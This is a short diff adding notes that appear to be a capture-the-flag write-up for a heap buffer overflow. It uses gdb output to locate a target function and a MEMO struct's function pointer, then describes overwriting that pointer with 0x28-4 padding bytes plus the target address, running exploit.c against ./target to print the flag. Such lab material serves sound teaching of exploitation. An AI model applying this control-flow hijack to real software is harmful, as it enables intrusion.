@@ -1,0 +1,26 @@
+(gdb) print jump_to_here
+$3 = {void ()} 0x80486f5 <jump_to_here>
+jump_to_here function has 0x080486f5 as the address.
+
+(gdb) print pointer
+$1 = {0x804b008, 0x804b030, 0x0, 0x0, 0x0}
+
+The address of new MEMO struct differs by 0x28.
+
+(gdb) x 0x804b008
+0x804b008:      0x08048783
+(gdb) print print
+$2 = {void (char *)} 0x8048783 <print>
+
+The first 4 bytes are for func.
+So the goal is to overwrite func value using buffer overflow from pointer[0].data
+
+First create two MEMO instances and write 0x28-4 bytes of 'x', followed by 0x080486f5.
+Then print the second memo so that the overwritten function is executed.
+Then the flag is printed.
+
+compile
+gcc exploit.c -std=c99 -o exploit
+
+execute
+./exploit | ./target
